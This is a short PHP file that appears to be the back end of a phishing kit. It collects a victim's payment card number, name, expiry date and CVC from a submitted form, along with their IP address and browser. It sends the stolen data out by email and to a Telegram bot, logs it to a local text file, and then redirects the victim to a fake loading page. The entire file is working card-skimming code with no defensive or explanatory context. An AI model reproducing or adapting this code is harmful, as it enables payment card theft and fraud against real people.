<?php
// include_once 'functions.php';
    
    $IP = getenv("REMOTE_ADDR");
    $message .= "-------[Info ]-------\n";


    $message .= "Number-Card : ".$_POST['cardnumber']."\n";
    $message .= "Name : ".$_POST['Name']."\n";
    $message .= "MM : ".$_POST['MM']."\n";
    $message .= "YY : ".$_POST['YY']."\n";
  
    $message .= "CVC : ".$_POST['cvv']."\n";
   
    $message .= "-------------- IP Infos ------------\n";
    $message .= "https://geoiptool.com/en/?ip=$IP\n";
    $message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
  
    $subject = "sa Post [ " . $IP . " ] ";
    $email = "".$EX445093_REMOT."";
    mail($email,$subject,$message);
    $text = fopen('./bando.txt', 'a');
    fwrite($text, $message);
    
    $token = "3333333333333333333333333333333333333333333333333333333";
    
    $data = [
    'text' => $message,
    'chat_id' => '2083566538'
];
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    
    // Attendre 19 secondes
    // sleep(19);
    
    header("location: ../Divs/LOADING.html");
   
?>
